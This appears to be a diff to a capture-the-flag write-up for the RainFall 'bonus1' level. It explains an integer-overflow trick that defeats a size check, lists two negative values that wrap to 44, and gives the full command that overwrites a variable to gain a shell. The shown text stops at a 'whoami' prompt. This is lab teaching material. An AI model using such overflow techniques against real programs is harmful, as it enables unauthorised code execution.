@@ -4,7 +4,15 @@ that is used later in memcpy to choose the number of bytes written to the buffer
 we need to overwrite esp+0x3c from esp+0x14 (40 bytes)
 argv[2] : `perl -e 'print "A"x40 . "\x46\x4c\x4f\x57"'`
 
-we need to write 44 bytes (40 bytes of buffer and 4 bytes of nbr) but we can't 
+we need to write 44 bytes (40 bytes of buffer and 4 bytes of nbr) but we can't juste entrer "11"
+in the program because of the first condition `atoi(argv[1]) <= 9` but thank's to the `*4` later
+we can overflow the int. So we need to find a signed number lower <= 9 but equal to 44 (uint)
+when multiplied by 4.
+
+I made a small program (atoi_exploit_finder.c) in c to find one, and 2 numbers are possible :
+    (int)      (uint)      (uint) * 4
+-2147483637  2147483659       44
+-1073741813  3221225483       44
 
 bonus1@RainFall:~$ ./bonus1 -1073741813 `perl -e 'print "A"x40 . "\x46\x4c\x4f\x57"'`
 $ whoami
